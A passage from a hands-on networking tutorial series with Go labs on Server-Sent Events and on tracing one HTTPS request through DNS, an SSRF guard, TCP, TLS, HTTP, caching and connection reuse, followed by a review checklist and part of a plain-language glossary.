| **WebSocket** | both ways | HTTP/1.1 `Upgrade` (or HTTP/2 extended CONNECT) | Full duplex, binary frames; needs proxy support for `Upgrade` |
| **gRPC streaming** | both ways | HTTP/2 streams | Typed; needs HTTP/2 end to end, or a translating proxy |
| **Long polling** | server → client | repeated requests | The fallback that works everywhere |

An SSE stream is just text:

```
id: 42
event: tick
data: {"n":42}

: this line is a comment, used as a heartbeat

```

What every hop needs:

- **The server must flush** after each event. Otherwise events sit in a buffer.
- **Proxies must not buffer**: nginx needs `proxy_buffering off` or the
  `X-Accel-Buffering: no` response header. Go's `ReverseProxy` flushes
  `text/event-stream` responses immediately.
- **Heartbeats** must be shorter than the smallest idle timeout on the path
  (load balancers are often 60 s, NAT mappings sometimes 30 s).
- **Server write deadlines** must be extended for the stream. Otherwise a
  timeout meant for normal requests ends it.
- **Reconnects** must resume (`Last-Event-ID`) and be jittered, so a deploy
  doesn't cause every client to reconnect at the same instant.

### Build it in Go (30 min) — SSE, and the WriteTimeout trap

`sse` serves two endpoints from one server with `WriteTimeout: 3s`, a
sensible value for ordinary requests. `/events-naive` ignores the timeout;
`/events` extends its own write deadline before each event with
`http.ResponseController` (Go 1.20+):

```go
// sse: Server-Sent Events -- a long-lived HTTP response that streams events --
// and the production details that break it: flushing, heartbeats, resuming
// with Last-Event-ID, and a server WriteTimeout that silently cuts streams.
//
//	go run ./sse                 # runs the server and two clients, prints a timeline
//	go run ./sse -serve :8090    # then: curl -N localhost:8090/events
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"time"
)

// events streams one event per second. If extend is true, it pushes its own
// write deadline forward before every write, so a server-wide WriteTimeout
// (meant for normal requests) doesn't kill this long-lived stream.
func events(extend bool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		rc := http.NewResponseController(w) // Go 1.20+: Flush, SetWriteDeadline per request
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.Header().Set("X-Accel-Buffering", "no") // tells nginx not to buffer this response

		id := 0
		if last := r.Header.Get("Last-Event-ID"); last != "" { // a reconnecting client resumes
			id, _ = strconv.Atoi(last)
		}
		tick := time.NewTicker(time.Second)
		defer tick.Stop()
		for {
			select {
			case <-r.Context().Done(): // client went away: stop working for it
				return
			case <-tick.C:
				if extend {
					rc.SetWriteDeadline(time.Now().Add(10 * time.Second))
				}
				id++
				if id%5 == 0 {
					fmt.Fprint(w, ": heartbeat\n\n") // a comment line: keeps proxies/NATs from idling us out
				}
				_, err := fmt.Fprintf(w, "id: %d\nevent: tick\ndata: {\"n\":%d}\n\n", id, id)
				if err == nil {
					err = rc.Flush() // without this, events sit in a buffer
				}
				if err != nil {
					return
				}
			}
		}
	}
}

func main() {
	serve := flag.String("serve", "", "just run the server on this address")
	flag.Parse()
	mux := http.NewServeMux()
	mux.Handle("/events", events(true))
	mux.Handle("/events-naive", events(false))
	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second,
		WriteTimeout: 3 * time.Second} // a "sensible" timeout for normal requests...
	if *serve != "" {
		srv.Addr = *serve
		fmt.Println("serving SSE on", *serve, "-- try: curl -N localhost"+*serve+"/events")
		srv.ListenAndServe()
		return
	}

	ts := httptest.NewUnstartedServer(mux)
	ts.Config = srv
	ts.Start()
	defer ts.Close()

	for _, path := range []string{"/events-naive", "/events"} {
		fmt.Printf("== %s (server WriteTimeout = 3s)\n", path)
		listen(ts.URL+path, "", 6*time.Second)
	}
	fmt.Println("== /events again, resuming with Last-Event-ID: 4")
	listen(ts.URL+"/events", "4", 2500*time.Millisecond)
}

func listen(url, lastID string, d time.Duration) {
	req, _ := http.NewRequest("GET", url, nil)
	if lastID != "" {
		req.Header.Set("Last-Event-ID", lastID)
	}
	start := time.Now()
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	sc := bufio.NewScanner(resp.Body)
	done := time.After(d - time.Since(start)) // d counts from the request, not the headers
	lines := make(chan string)
	go func() {
		for sc.Scan() {
			lines <- sc.Text()
		}
		close(lines)
	}()
	for {
		select {
		case <-done:
			fmt.Printf("  %4.1fs  (client stops listening)\n\n", time.Since(start).Seconds())
			return
		case l, ok := <-lines:
			if !ok {
				fmt.Printf("  %4.1fs  STREAM CUT by the server (%v)\n\n", time.Since(start).Seconds(), sc.Err())
				return
			}
			if strings.HasPrefix(l, "data:") || strings.HasPrefix(l, ":") {
				fmt.Printf("  %4.1fs  %s\n", time.Since(start).Seconds(), l)
			}
		}
	}
}
```

```text
$ go run ./sse
== /events-naive (server WriteTimeout = 3s)
   1.0s  data: {"n":1}
   2.0s  data: {"n":2}
   3.0s  STREAM CUT by the server (unexpected EOF)

== /events (server WriteTimeout = 3s)
   1.0s  data: {"n":1}
   2.0s  data: {"n":2}
   3.0s  data: {"n":3}
   4.0s  data: {"n":4}
   5.0s  : heartbeat
   5.0s  data: {"n":5}
   6.0s  (client stops listening)

== /events again, resuming with Last-Event-ID: 4
   1.0s  : heartbeat
   1.0s  data: {"n":5}
   2.0s  data: {"n":6}
   2.5s  (client stops listening)
```

**What to notice:**

- **The naive stream died at exactly 3.0 s.** `WriteTimeout` covers the whole
  response, and for a stream "the whole response" never ends. This is one of
  the most common Go streaming bugs, and it looks like a network problem.
- **`rc.SetWriteDeadline` extends the deadline per request**, so normal
  endpoints keep the protective 3 s timeout and only the stream gets more time.
- **Resume works**: a client reconnecting with `Last-Event-ID: 4` continues at
  event 5. Browsers' `EventSource` sends this header automatically when they
  reconnect.
- **`r.Context().Done()`** fires when the client disconnects, so the handler
  stops instead of writing to nobody.

**Exercises:**

1. Put Chapter 20's `revproxy` in front of the SSE server. Do events still
   arrive one per second? (They should: Go flushes `text/event-stream`.) Then
   put nginx in front with default settings and compare.
2. Add a broadcast hub: one goroutine produces events, and each connected
   client gets a buffered channel. Decide what happens when a client's channel
   is full (drop the client? drop events?). That decision is the core of every
   real-time system.
3. On SIGTERM, send each client a final `event: reconnect` with a `retry:`
   field set to a random delay, so they don't all come back at once.

### Real-world scenario
A team launches live order tracking with SSE. It works in staging. In
production, updates arrive in bursts every 30 seconds: the ingress controller
buffers responses. After that is fixed, streams drop every 60 seconds: the
cloud load balancer's idle timeout, because no heartbeat was being sent. After
that, every deploy causes a reconnect storm that overloads the new pods.
Each problem lived at a different hop, and each needed its own setting.

### Common mistakes
- Forgetting to flush, or having a proxy that buffers.
- No heartbeat, so idle timeouts cut quiet streams.
- A global `WriteTimeout` that kills streams (or no timeouts at all, to "fix" it).
- No resume support, so clients miss events across reconnects.
- No jitter on reconnect, so deploys cause synchronised stampedes.

### Check yourself
1. Why did `/events-naive` die at exactly 3 seconds?
2. What does a heartbeat comment line protect against?
3. When would you choose WebSocket over SSE?

### Key Takeaways
- Long-lived streams need settings at every hop: flushing, no buffering, heartbeats, per-stream deadlines.
- Resume with `Last-Event-ID`, and reconnect with jitter.
- Test streaming through the same proxies and load balancers you use in production.

**Across the series:** the [TCP/IP guide's WebSockets and SSE chapter](../networking/tcp-ip/real-life-guide-v1.md#chapter-43-websockets-and-server-sent-events)
covers the protocols on the wire, and the Go plan's [Day 66](../Golang/detailed-90-day-plan/week9.md#day-66-websocket)
builds a WebSocket server.

---

# Part 10 — The whole series in one request

This is the last stop of the series. You've studied the machine (the
[Linux guide](../os-linux/real-life-os-guide.md)), the network (the [OSI](../networking/real-life-example-osi.md) and
[TCP/IP](../networking/tcp-ip/real-life-guide-v1.md) guides), how systems are attacked and defended (the
[security guides](../security/real-life-security-guide-v1.md)), and the web request lifecycle (this guide). This
part puts all of it into **one Go program and one HTTPS request**, and labels
every step with the guide that explains it.

## Chapter 25 — One HTTPS request, every layer, every guide

### In one sentence
A single `GET https://example.com/` touches the process and its file
descriptors, DNS, a security decision, a TCP handshake, a TLS handshake with
certificate verification, HTTP, caches, browser security policy, and
connection reuse, and you can observe each of those from one Go program.

### Why this matters
Incidents, design reviews, and interviews all come down to the same skill:
following one request through every layer and knowing which layer you're
looking at. The guides in this series each teach some of those layers in depth.
This chapter is the map that joins them, as running code you can point at any
URL.

### How it actually works
The program reuses techniques from labs across the series:

| Step | Technique | Built in |
|---|---|---|
| 1, 10 Process view | counting file descriptors and goroutines before and after | [Linux Ch 73, 78](../os-linux/real-life-os-guide.md#chapter-73-go-meets-the-kernel-system-calls-threads-and-the-runtime) |
| 2 DNS | `net.Resolver.LookupNetIP` | [TCP/IP Ch 18](../networking/tcp-ip/real-life-guide-v1.md#chapter-18-dns-turning-names-into-addresses) (`dnsquery`) |
| 3 Security pre-flight | `Dialer.Control` blocking non-public IPs | [HTTPS Ch 22](#chapter-22-outbound-requests-ssrf-and-safe-http-clients) (`ssrfguard`), [Security in Depth Ch 33](../security/real-life-security-guide-v1.md#chapter-33-ssrf-mastery) |
| 4 TCP | `httptrace` connect timing | [TCP/IP Ch 21](../networking/tcp-ip/real-life-guide-v1.md#chapter-21-tcp-part-1-the-three-way-handshake) (`dialcheck`) |
| 5 TLS | `VerifyConnection` + the verified chain | [TCP/IP Ch 29](../networking/tcp-ip/real-life-guide-v1.md#chapter-29-tls-how-it-gets-encrypted) (`tlsinspect`), [HTTPS Ch 16](#chapter-16-certificate-and-domain-operations-acme-rotation-ct-monitoring-and-emergency-revocation) (`certcheck`) |
| 6 HTTP | `httptrace` TTFB, `Alt-Svc` | [HTTPS Ch 14, 17](#chapter-17-debugging-the-lifecycle-browser-devtools-curl-openssl-packet-capture-and-logs) (`protoprobe`, `httptrace`) |
| 7 Cache | response cache headers | [HTTPS Ch 15](#chapter-15-cache-correctness-browser-cdn-proxy-and-application-caches) (`edgecache`) |
| 8 Security headers | HSTS, CSP, and the rest | [HTTPS Ch 19](#chapter-19-a-production-https-server-in-go-tls-timeouts-headers-and-shutdown) (`httpsserver`), [Security in Depth Part 6](../security/real-life-security-guide-v1.md#part-6-advanced-web-and-api-exploitation) |
| 9 Reuse | the same `http.Client` twice | [OSI Part 7](../networking/real-life-example-osi.md#part-7-layer-5-session), [HTTPS Ch 17](#chapter-17-debugging-the-lifecycle-browser-devtools-curl-openssl-packet-capture-and-logs) |

### Build it in Go (30 min) — the walkthrough

```go
// walkthrough: the whole series in one program. It makes one real HTTPS
// request and reports every step -- operating system, network, security,
// HTTP -- with the guide and chapter that explains it.
//
//	go run ./walkthrough https://example.com/
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptrace"
	"net/netip"
	"net/url"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
)

func step(n int, layer, title, ref string) {
	fmt.Printf("\n%2d. [%s] %s\n    see: %s\n", n, layer, title, ref)
}

func detail(format string, a ...any) { fmt.Printf("    "+format+"\n", a...) }

// openFDs counts this process's open file descriptors by asking the kernel
// about each number in turn (works on Linux and macOS; /proc/self/fd is Linux-only).
func openFDs() int {
	n := 0
	for fd := 0; fd < 4096; fd++ {
		var st syscall.Stat_t
		if syscall.Fstat(fd, &st) == nil {
			n++
		}
	}
	return n
}

// publicOnly is the SSRF guard: runs after DNS, before connect().
func publicOnly(_, address string, _ syscall.RawConn) error {
	ap, err := netip.ParseAddrPort(address)
	if err != nil {
		return err
	}
	ip := ap.Addr().Unmap()
	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() || ip.IsMulticast() {
		return fmt.Errorf("blocked non-public address %s", ip)
	}
	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("usage: walkthrough https://host/path")
		os.Exit(2)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil || u.Scheme != "https" {
		fmt.Println("need an https:// URL")
		os.Exit(2)
	}
	host := u.Hostname()

	step(1, "OS", "the process that will make the request",
		"Linux guide Ch 73 (threads), Ch 75 (GOMAXPROCS), Ch 78 (file descriptors)")
	detail("pid %d, GOMAXPROCS %d, goroutines %d, open file descriptors %d",
		os.Getpid(), runtime.GOMAXPROCS(0), runtime.NumGoroutine(), openFDs())

	step(2, "L7 DNS", "resolve the name", "TCP/IP guide Ch 18 (dnsquery), HTTPS guide Ch 2")
	t0 := time.Now()
	ips, err := net.DefaultResolver.LookupNetIP(context.Background(), "ip", host)
	if err != nil {
		detail("FAILED: %v", err)
		os.Exit(1)
	}
	detail("%s -> %v in %v", host, ips, time.Since(t0).Round(time.Millisecond))

	step(3, "Security", "is it safe to connect? (SSRF pre-flight on the resolved addresses)",
		"HTTPS guide Ch 22 (ssrfguard), Security in Depth Ch 33 (SSRF)")
	for _, ip := range ips {
		if err := publicOnly("tcp", netip.AddrPortFrom(ip, 443).String(), nil); err != nil {
			detail("REFUSED: %v", err)
			os.Exit(1)
		}
	}
	detail("all %d addresses are public; the same check runs again inside the dialer at connect time", len(ips))

	// One client, reused for both requests: a connection pool (HTTPS guide Ch 17).
	var tlsState tls.ConnectionState
	client := &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			DialContext:       (&net.Dialer{Timeout: 5 * time.Second, Control: publicOnly}).DialContext,
			ForceAttemptHTTP2: true,
			TLSClientConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
				VerifyConnection: func(cs tls.ConnectionState) error { // runs after normal verification
					tlsState = cs
					return nil
				},
			},
		},
	}

	var connStart, connDone, tlsStart, tlsDone, wrote, first time.Time
	var remote, local string
	var reused bool
	trace := &httptrace.ClientTrace{
		ConnectStart: func(_, _ string) { connStart = time.Now() },
		ConnectDone: func(_, addr string, err error) {
			connDone, remote = time.Now(), addr
		},
		TLSHandshakeStart:    func() { tlsStart = time.Now() },
		TLSHandshakeDone:     func(tls.ConnectionState, error) { tlsDone = time.Now() },
		GotConn:              func(i httptrace.GotConnInfo) { reused, local = i.Reused, i.Conn.LocalAddr().String() },
		WroteRequest:         func(httptrace.WroteRequestInfo) { wrote = time.Now() },
		GotFirstResponseByte: func() { first = time.Now() },
	}

	start := time.Now()
	req, _ := http.NewRequestWithContext(httptrace.WithClientTrace(context.Background(), trace), "GET", u.String(), nil)
	resp, err := client.Do(req)
	if err != nil {
		var ce *tls.CertificateVerificationError
		if errors.As(err, &ce) {
			detail("TLS verification FAILED: %v", ce.Err)
		} else {
			detail("request FAILED: %v", err)
		}
		os.Exit(1)
	}
	body, _ := io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	end := time.Now()

	step(4, "L3/L4 TCP", "three-way handshake", "OSI guide Part 6, TCP/IP guide Ch 21 (dialcheck), Ch 12 (NAT)")
	detail("%s -> %s, connect took %v (~1 round trip)", local, remote, connDone.Sub(connStart).Round(time.Millisecond))

	step(5, "L5/L6 TLS", "encrypted, authenticated channel", "HTTPS guide Ch 4 & 16, TCP/IP guide Ch 29 & 56, Security from Zero (TLS, PKI)")
	detail("%s, %s, ALPN %q, handshake %v", tls.VersionName(tlsState.Version),
		tls.CipherSuiteName(tlsState.CipherSuite), tlsState.NegotiatedProtocol, tlsDone.Sub(tlsStart).Round(time.Millisecond))
	if len(tlsState.VerifiedChains) > 0 {
		chain := tlsState.VerifiedChains[0]
		leaf := chain[0]
		detail("certificate for %v, issued by %q, %d days left", leaf.DNSNames, leaf.Issuer.CommonName,
			int(time.Until(leaf.NotAfter).Hours()/24))
		detail("chain verified to root %q in this machine's trust store", chain[len(chain)-1].Subject.CommonName)
		checkKey(leaf)
	}

	step(6, "L7 HTTP", "request and response", "HTTPS guide Ch 5 (HTTP), Ch 14 (versions), Ch 17 (httptrace)")
	detail("%s %s, %d bytes; server think time + 1 RTT (TTFB) %v; total %v",
		resp.Proto, resp.Status, body, first.Sub(wrote).Round(time.Millisecond), end.Sub(start).Round(time.Millisecond))
	if alt := resp.Header.Get("Alt-Svc"); alt != "" {
		detail("Alt-Svc: %s  (HTTP/3 offered for next time)", alt)
	}

	step(7, "L7 cache", "who may cache this response, and did a cache answer?", "HTTPS guide Ch 10 & 15 (edgecache), Security in Depth Ch 31")
	for _, h := range []string{"Cache-Control", "Age", "Vary", "ETag", "CF-Cache-Status", "X-Cache"} {
		if v := resp.Header.Get(h); v != "" {
			detail("%-16s %s", h+":", v)
		}
	}

	step(8, "Security", "browser-side defences the server asked for", "HTTPS guide Ch 12 & 19, Security in Depth Part 6")
	for _, h := range []string{"Strict-Transport-Security", "Content-Security-Policy", "X-Content-Type-Options",
		"Referrer-Policy", "X-Frame-Options", "Permissions-Policy"} {
		v := resp.Header.Get(h)
		mark := "present"
		if v == "" {
			mark, v = "MISSING", ""
		}
		if len(v) > 60 {
			v = v[:60] + "..."
		}
		detail("%-26s %-8s %s", h, mark, v)
	}

	step(9, "L4/L5 reuse", "a second request on the same client", "OSI guide Part 7, HTTPS guide Ch 17")
	start = time.Now()
	req2, _ := http.NewRequestWithContext(httptrace.WithClientTrace(context.Background(), trace), "GET", u.String(), nil)
	if resp2, err := client.Do(req2); err == nil {
		io.Copy(io.Discard, resp2.Body)
		resp2.Body.Close()
		detail("reused connection: %v, total %v (no DNS, TCP, or TLS this time)", reused, time.Since(start).Round(time.Millisecond))
	}

	step(10, "OS", "what the request cost the process", "Linux guide Ch 73 & 78, TCP/IP guide Ch 23 (connection states)")
	detail("goroutines %d, open file descriptors %d (the pooled connection stays open for reuse)",
		runtime.NumGoroutine(), openFDs())
	fmt.Println()
}

// checkKey applies a tiny policy check to the leaf certificate (Security in
// Depth Ch 59/61: policy as code).
func checkKey(c *x509.Certificate) {
	lifetime := int(c.NotAfter.Sub(c.NotBefore).Hours() / 24)
	verdict := "ok"
	if lifetime > 398 {
		verdict = "longer than browsers accept"
	}
	detail("key %s, lifetime %d days (%s)", strings.ToLower(c.PublicKeyAlgorithm.String()), lifetime, verdict)
}
```

A real run:

```text

 1. [OS] the process that will make the request
    see: Linux guide Ch 73 (threads), Ch 75 (GOMAXPROCS), Ch 78 (file descriptors)
    pid 87003, GOMAXPROCS 14, goroutines 1, open file descriptors 3

 2. [L7 DNS] resolve the name
    see: TCP/IP guide Ch 18 (dnsquery), HTTPS guide Ch 2
    example.com -> [104.20.23.154 172.66.147.243 2606:4700:83b5:72db:f2fe:4b1:ef6b:ff98] in 38ms

 3. [Security] is it safe to connect? (SSRF pre-flight on the resolved addresses)
    see: HTTPS guide Ch 22 (ssrfguard), Security in Depth Ch 33 (SSRF)
    all 3 addresses are public; the same check runs again inside the dialer at connect time

 4. [L3/L4 TCP] three-way handshake
    see: OSI guide Part 6, TCP/IP guide Ch 21 (dialcheck), Ch 12 (NAT)
    192.168.1.2:58567 -> 104.20.23.154:443, connect took 17ms (~1 round trip)

 5. [L5/L6 TLS] encrypted, authenticated channel
    see: HTTPS guide Ch 4 & 16, TCP/IP guide Ch 29 & 56, Security from Zero (TLS, PKI)
    TLS 1.3, TLS_AES_128_GCM_SHA256, ALPN "h2", handshake 25ms
    certificate for [example.com *.example.com], issued by "Cloudflare TLS Issuing ECC CA 3", 83 days left
    chain verified to root "SSL.com TLS ECC Root CA 2022" in this machine's trust store
    key ecdsa, lifetime 90 days (ok)

 6. [L7 HTTP] request and response
    see: HTTPS guide Ch 5 (HTTP), Ch 14 (versions), Ch 17 (httptrace)
    HTTP/2.0 200 OK, 577 bytes; server think time + 1 RTT (TTFB) 19ms; total 63ms
    Alt-Svc: h3=":443"; ma=86400  (HTTP/3 offered for next time)

 7. [L7 cache] who may cache this response, and did a cache answer?
    see: HTTPS guide Ch 10 & 15 (edgecache), Security in Depth Ch 31
    Age:             5408
    CF-Cache-Status: HIT

 8. [Security] browser-side defences the server asked for
    see: HTTPS guide Ch 12 & 19, Security in Depth Part 6
    Strict-Transport-Security  MISSING
    Content-Security-Policy    MISSING
    X-Content-Type-Options     MISSING
    Referrer-Policy            MISSING
    X-Frame-Options            MISSING
    Permissions-Policy         MISSING

 9. [L4/L5 reuse] a second request on the same client
    see: OSI guide Part 7, HTTPS guide Ch 17
    reused connection: true, total 21ms (no DNS, TCP, or TLS this time)

10. [OS] what the request cost the process
    see: Linux guide Ch 73 & 78, TCP/IP guide Ch 23 (connection states)
    goroutines 2, open file descriptors 7 (the pooled connection stays open for reuse)
```

### Reading the output, step by step

- **1 → 10, the process:** 3 file descriptors before (stdin, stdout, stderr)
  and 7 after: the pooled TLS connection, plus the runtime's netpoller (epoll on
  Linux, kqueue on macOS) and its wakeup descriptors. The connection stays
  open on purpose, waiting for reuse ([Linux Ch 78](../os-linux/real-life-os-guide.md#chapter-78-file-descriptors-and-the-netpoller-holding-thousands-of-connections)).
  One extra goroutine is reading from it ([Linux Ch 73](../os-linux/real-life-os-guide.md#chapter-73-go-meets-the-kernel-system-calls-threads-and-the-runtime)).
- **2, DNS:** three addresses, two IPv4 and one IPv6, in 38 ms. A CDN's
  anycast front door ([HTTPS Ch 7](#chapter-7-nat-vip-bgp-anycast-vrrp-global-traffic-routing)).
- **3, security before connecting:** every address is public, so a server
  making this request on a user's behalf is not being steered into its own
  network. Point the program at `https://localtest.me/` and it stops here:
  `REFUSED: blocked non-public address ::1`.
- **4, TCP:** 17 ms to connect, which is one round trip. Your private source
  address (`192.168.1.2`) is rewritten by NAT on the way out
  ([TCP/IP Ch 12](../networking/tcp-ip/real-life-guide-v1.md#chapter-12-private-addresses-and-nat)).
- **5, TLS:** TLS 1.3 in one round trip, HTTP/2 chosen by ALPN, a 90-day ECDSA
  certificate verified to a root in *this machine's* trust store. Point it at
  `https://expired.badssl.com/` and it stops here with
  `x509: certificate has expired`.
- **6, HTTP:** TTFB 19 ms ≈ 1 RTT, so the server spent almost no time
  thinking. That fits step 7.
- **7, cache:** `CF-Cache-Status: HIT` with `Age: 5408`. The CDN answered from
  a copy about 90 minutes old, and the origin never saw this request.
- **8, security headers:** example.com sends **none** of them. That's fine for a
  static placeholder page, and a finding for any real application. Compare with
  `https://github.com/`, which sends HSTS with `preload`.
- **9, reuse:** 21 ms instead of 63 ms. No DNS, no TCP, no TLS: the cheapest
  performance win in the series.

**Exercises:**

1. Run it against your own service from inside and outside your network, and
   explain every difference using the guide each step points to.
2. Add an `-insecure-lab` mode that skips step 3 for local testing, and make
   sure it can't be enabled in production builds.
3. On Linux, add a step that reads `TCP_INFO` for the live connection (RTT,
   congestion window) using the [TCP/IP guide's `tcpinfo` lab](../networking/tcp-ip/real-life-guide-v1.md#chapter-33-ss-what-your-machine-s-connections-are-doing).
4. Add a step that runs Chapter 20's checks on the response path: does a proxy
   in front add `X-Forwarded-For`, and would your app trust it?

### Turning the walkthrough into a review checklist

The same ten steps make a design-review checklist for any HTTPS service:

```
 1  Process      runs non-root, limits set, GOMAXPROCS/GOMEMLIMIT right?      Linux Ch 75-76, 82
 2  DNS          TTLs planned, two providers for critical names, DNSSEC?      TCP/IP Ch 55
 3  Outbound     user-supplied URLs fetched through an SSRF-safe client?      HTTPS Ch 22
 4  Transport    timeouts on every hop, idle timeouts nested, pools sized?    HTTPS Ch 19, TCP/IP Ch 57
 5  TLS          automated certificates, inventory, expiry alerts, mTLS east-west?  HTTPS Ch 16, Security Ch 23
 6  HTTP         idempotency on writes, retries at ONE layer, SLOs defined?   HTTPS Ch 21, 23
 7  Cache        every response has an explicit Cache-Control, Vary correct?  HTTPS Ch 15
 8  Headers      HSTS, CSP, nosniff, frame-ancestors on every response?       HTTPS Ch 19
 9  Reuse        keep-alive tuned, graceful shutdown drains connections?      TCP/IP Ch 57, Linux Ch 82
10  Evidence     logs, metrics, traces, tamper-evident audit trail?           Security Ch 51-52
```

### Check yourself
1. Which step of the walkthrough would you look at first if users report
   "the site is slow, but only the first visit"? Why?
2. Why does the SSRF check run both before connecting *and* inside the dialer?
3. Why are there more file descriptors at the end than at the start, and is
   that a leak?

### Key Takeaways
- One request crosses every layer this series teaches, and each one is observable from code.
- Every step maps to a guide: when a step looks wrong, you know where to read.
- The ten steps double as a production-readiness checklist.

---

## You've completed the series

From the kernel to the browser: OS, networking, security, and one HTTPS request traced through all of them. Go back to any step with the [series map](#0-5-the-series-os-networking-security-https), or take the [Go 120-day plan](../Golang/golang-90-day-plan.md)'s capstone, a cloud-edge security proxy that uses every guide at once.

**That's the practical lifecycle** — from pressing Enter to a rendered,
secured, monitored page, and the major mechanisms in between. If you've read
straight through, you now have a single coherent model connecting DNS, TCP,
TLS, HTTP, global routing, proxies, load balancers, CDNs, rendering,
security, traffic engineering, and production operations — pieces that are
usually taught as separate, unrelated subjects.

**Where to go next**, if you want to go deeper on any one piece:

- **[Networking from Zero (TCP/IP)](../networking/tcp-ip/real-life-guide-v1.md)**:
  a slower, hands-on companion for Parts 1–4 here, with home-lab exercises,
  packet-capture practice, subnetting drills, and 23 Go labs (a DNS client
  from raw bytes, a pcap decoder, a load balancer with draining, and more).
- **[The OSI Model, One Click at a Time](../networking/real-life-example-osi.md)**:
  the same request seen layer by layer, with a millisecond timeline and a
  debugging playbook organised by layer. Good for teaching others.
- **[Operating Systems, Linux, and Containers](../os-linux/real-life-os-guide.md)**:
  Parts 11 and 19 cover Linux's own networking and operations view, and Parts
  14–17 cover the containers and Kubernetes your HTTPS services run in.
- **[Go — The Complete Field Guide](../Golang/real-life-golang-guide.md)** and the
  **[Go 120-day plan](../Golang/golang-90-day-plan.md)**: Part 9's labs grow
  into the plan's multi-week projects: a TLS reverse proxy, a WAF, API security,
  DDoS defences, and a [cloud-edge security proxy capstone](../Golang/detailed-90-day-plan/week17.md).
- **[security/real-life-guide.md](../security/real-life-guide.md)** and
  **[security/real-life-security-guide-v1.md](../security/real-life-security-guide-v1.md)**:
  Chapter 12 here is a survey; those guides go deep on threat modeling, PKI
  operations, and exploitation the way a security engineer needs.
- **[scale-perf/real-life-scale-guide.md](../scale-perf/real-life-scale-guide.md)**:
  if Chapters 9, 10, 17, and 21 made you want to load-test one of these
  systems, this is the hands-on, tool-by-tool guide for that.

---

# Appendix A — Glossary (plain language)

**ALPN (Application-Layer Protocol Negotiation)** — a field in the TLS
ClientHello where the client advertises which HTTP version it supports
(`h2`, `http/1.1`, `h3`), avoiding a separate negotiation round trip.

**ACME (Automatic Certificate Management Environment)** — the protocol used by
Let's Encrypt and many certificate automation systems to issue and renew TLS
certificates.

**Alt-Svc (Alternative Services)** — an HTTP header that tells clients the same
origin is available over another protocol or endpoint, commonly used to
advertise HTTP/3 support.

**Anycast** — announcing the same IP prefix from multiple geographic
locations via BGP; each user is routed to the nearest one automatically.

**BGP (Border Gateway Protocol)** — the internet's routing protocol; how
Autonomous Systems tell each other which IP prefixes they own and how to
reach them.

**Cache-Control** — the response header that tells browsers and CDNs
whether and how long to cache a response (`no-store`, `max-age`,
`immutable`, `s-maxage`).

**CDN (Content Delivery Network)** — a network of edge servers, distributed
geographically, that cache content close to users to cut latency and
origin load.

**Certificate Transparency (CT)** — public append-only logging for publicly
trusted certificates, letting domain owners and browsers detect unexpected or
misissued certificates.

**Circuit Breaker** — a pattern that stops sending requests to a struggling
backend once its error rate crosses a threshold, letting it recover instead
of being bombarded.

**CORS (Cross-Origin Resource Sharing)** — the browser-enforced mechanism
that lets a server explicitly permit JavaScript on other origins to read
its responses.

**CSP (Content Security Policy)** — a response header that whitelists which
sources a page may load scripts, styles, and other resources from, as a
defense against XSS.

**D-NAT (Destination NAT)** — rewriting a packet's destination address;
Netflix's load balancer uses this to route a public VIP to a private
backend server.

**DNS (Domain Name System)** — the internet's phone book; resolves a
hostname like `www.netflix.com` into an IP address.

**DNSSEC** — cryptographic signing of DNS records so resolvers can detect
and reject forged answers (authentication, not encryption).

**DoH / DoT (DNS over HTTPS / DNS over TLS)** — encrypting DNS queries so
ISPs and network eavesdroppers can't see which domains you look up.

**ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)** — the key exchange
method TLS 1.3 uses so both sides derive the same session key without ever
transmitting it, and a fresh key pair is generated per connection (forward
secrecy).

**ECH (Encrypted ClientHello)** — a TLS mechanism that encrypts sensitive
ClientHello fields such as SNI when supported by the client, resolver, and
server-side infrastructure.

**Forward Proxy** — a proxy that serves clients, making requests to the
internet on their behalf; the server never sees the client's real address.

**Forward Secrecy** — the property that recording an encrypted session
today doesn't let an attacker decrypt it later, even if they steal the
server's long-term private key.

**Health Check** — a periodic probe (TCP connect, HTTP `GET /health`, or a
deep dependency check) a load balancer uses to decide whether a backend
should keep receiving traffic.

**HPACK** — the header-compression scheme HTTP/2 uses, referencing
previously seen header values by index instead of repeating them.

**HSTS (HTTP Strict Transport Security)** — a response header telling the
browser to only ever use HTTPS for a domain, closing the window where an
attacker could intercept the first plaintext HTTP request.

**HTTP/3** — HTTP semantics mapped onto QUIC rather than TCP; standardized in
RFC 9114.

**INP (Interaction to Next Paint)** — the Core Web Vital for interaction
responsiveness, replacing FID as a Core Web Vital in March 2024.

**IP Address** — a device's unique numeric address on a network (IPv4:
32-bit, `203.0.113.45`; IPv6: 128-bit, `2001:db8::1`).

**JWT (JSON Web Token)** — a signed (not encrypted) token format for
carrying claims about an authenticated user between client and server.

**Load Balancer (L4 / L7)** — a system that distributes requests across
many backend servers; L4 routes by IP/port only, L7 decrypts TLS and routes
by URL, headers, or cookies.

**mTLS (Mutual TLS)** — a TLS handshake where both the client and server
present certificates, so both sides authenticate each other.

**NAT (Network Address Translation)** — rewriting IP addresses in transit;
S-NAT rewrites the source (outbound), D-NAT rewrites the destination
(inbound).

**OSI Layers** — a 7-layer conceptual model (Physical, Data Link, Network,
Transport, Session, Presentation, Application) describing how data moves
across a network; the internet's TCP/IP model collapses this to 4.

**QUIC** — the UDP-based transport protocol underlying HTTP/3; implements
its own reliability and congestion control, eliminating TCP-level
head-of-line blocking.

**Rate Limiting** — controlling how many requests a client can make in a
given period, using algorithms like token bucket or sliding window.

**Reverse Proxy** — a proxy that serves servers, receiving client requests
